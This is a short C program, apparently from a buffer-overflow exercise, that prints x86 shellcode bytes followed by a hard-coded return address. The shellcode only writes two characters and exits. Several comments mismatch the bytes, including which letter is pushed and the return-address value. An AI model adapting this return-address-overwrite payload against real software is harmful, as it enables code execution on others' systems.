#include <stdio.h>
void main(){ 
	printf("\x6a\x62"); // push 0x62. to write ‘b’
	printf("\x89\xe6"); // mov esi, esp. buf location
	printf("\x31\xc0"); // xor eax, eax 
	printf("\xb0\x04"); //mov al, 0x4  system call number for write()
	printf("\x31\xdb"); //xor ebx, ebx 
	printf("\xb3\x01"); //mov bl,  0x1  file number
	printf("\x89\xf1"); //mov ecx, esi
	printf("\x31\xd2"); //xor edx, edx
	printf("\xb2\x01"); ////mov dl, 0x1  num of bytes to write
	printf("\xcd\x80"); //int 0x80. write(1, buf, 1). write 'a' in the screen.
	printf("\x6a\x61"); // push 0x62. to write ‘b’
	printf("\x89\xe6"); // mov esi, esp. buf location
	printf("\x31\xc0"); // xor eax, eax 
	printf("\xb0\x04"); //mov al, 0x4  system call number for write()
	printf("\x31\xdb"); //xor ebx, ebx 
	printf("\xb3\x01"); //mov bl,  0x1  file number
	printf("\x89\xf1"); //mov ecx, esi
	printf("\x31\xd2"); //xor edx, edx
	printf("\xb2\x01"); ////mov dl, 0x1  num of bytes to write
	printf("\xcd\x80"); //int 0x80. write(1, buf, 1). write 'a' in the screen.
	printf("\x31\xc0"); //xor eax, eax 
	printf("\x31\xc0"); //xor eax, eax 
	printf("\xb0\x01"); //mov al, 0x1  system call number for exit()  
	printf("\x31\xdb"); //xor ebx, ebx 
	printf("\xcd\x80"); //int 0x80. exit(0) 
	printf("\x12\xd6\xff\xff");//ret addr //fffd620
} 
